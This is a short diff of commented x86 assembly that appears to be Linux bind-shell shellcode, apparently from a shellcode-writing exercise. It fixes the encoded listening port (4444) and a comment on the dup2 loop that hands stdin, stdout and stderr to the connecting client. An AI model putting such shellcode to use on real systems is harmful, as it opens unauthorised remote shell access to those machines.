@@ -35,7 +35,7 @@ _start:
     ;           struct in_addr sin_addr;   /* internet address */
     ;       }
     pop ecx					; to make top of stack is 2. sin_addr=0
-    push word 0x3905		; port = 4444 . struct.pack("!H",socket.htons(4444)).encode('hex')
+    push word 0x5c11		; port = 4444 . struct.pack("!H",socket.htons(4444)).encode('hex')
     push word 0x2			; AF_INET
     ; Now stack have struct sockaddr_in
     mov ecx, esp			; move address of struct
@@ -68,7 +68,7 @@ _start:
 
     ; STDIN, STDOUT, STDERR with dup2()
     ;int dup2(int oldfd, int newfd)
-    mov ebx, eax	; return value of sockfd to ebx. this is "int oldfd"
+    mov ebx, eax	; return value of clientfd to ebx. this is "int oldfd"
     xor ecx, ecx	; remove x00 in ecx
     mov cl, 0x2	; Create loop from range 0-2. make dup2(ebx, ecx=2), dup2(ebx, ecx=1), dup2(ebx, ecx=0)
 
